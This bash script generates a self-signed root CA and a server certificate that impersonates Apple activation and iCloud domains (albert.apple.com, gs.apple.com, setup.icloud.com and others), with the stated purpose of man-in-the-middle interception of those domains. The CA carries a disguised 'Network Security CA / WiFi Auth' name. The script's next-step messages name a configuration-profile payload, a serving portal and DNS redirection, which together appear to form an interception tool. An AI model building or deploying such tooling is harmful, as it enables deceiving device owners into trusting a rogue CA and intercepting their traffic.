#!/usr/bin/env bash
#
# generate_ca.sh -- Generate self-signed Root CA and server certificates
# for MITM interception of Apple activation domains.
#
# Output files (in same directory as this script):
#   ca.key       -- Root CA private key
#   ca.crt       -- Root CA certificate (install on device via profile)
#   server.key   -- Server private key
#   server.csr   -- Server certificate signing request
#   server.crt   -- Server certificate (signed by our CA)
#
# Usage:
#   chmod +x generate_ca.sh
#   ./generate_ca.sh
#

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

echo "=== Certificate Generation ==="
echo "Output directory: $SCRIPT_DIR"
echo ""

# ---- Root CA -----------------------------------------------------------
echo "[1/4] Generating Root CA key..."
openssl genrsa -out ca.key 2048 2>/dev/null

echo "[2/4] Generating Root CA certificate..."
openssl req -new -x509 \
    -key ca.key \
    -out ca.crt \
    -days 3650 \
    -subj "/CN=Network Security CA/O=WiFi Auth/C=US" \
    2>/dev/null

echo "       Subject: CN=Network Security CA, O=WiFi Auth, C=US"
echo "       Validity: 10 years"

# ---- Server certificate ------------------------------------------------
echo "[3/4] Generating server key + CSR..."
openssl genrsa -out server.key 2048 2>/dev/null

openssl req -new \
    -key server.key \
    -out server.csr \
    -subj "/CN=albert.apple.com" \
    2>/dev/null

echo "[4/4] Signing server certificate with CA..."

# SAN extension for all Apple domains we intercept
openssl x509 -req \
    -in server.csr \
    -CA ca.crt \
    -CAkey ca.key \
    -CAcreateserial \
    -out server.crt \
    -days 365 \
    -extfile <(printf "subjectAltName=DNS:albert.apple.com,DNS:humb.apple.com,DNS:gs.apple.com,DNS:mesu.apple.com,DNS:captive.apple.com,DNS:osrecovery.apple.com,DNS:identity.ess.apple.com,DNS:setup.icloud.com") \
    2>/dev/null

echo "       CN: albert.apple.com"
echo "       SANs: albert, humb, gs, mesu, captive, osrecovery, identity, setup"
echo "       Validity: 1 year"

# ---- Summary -----------------------------------------------------------
echo ""
echo "=== Done ==="
echo "Files generated:"
for f in ca.key ca.crt server.key server.csr server.crt; do
    if [ -f "$f" ]; then
        size=$(wc -c < "$f" | tr -d ' ')
        echo "  $f  ($size bytes)"
    fi
done
echo ""
echo "Next steps:"
echo "  1. Run payloads/build_profile.py to embed ca.crt in a .mobileconfig"
echo "  2. Start server/portal.py to serve the profile"
echo "  3. Configure DNS with server/dns_config.py"
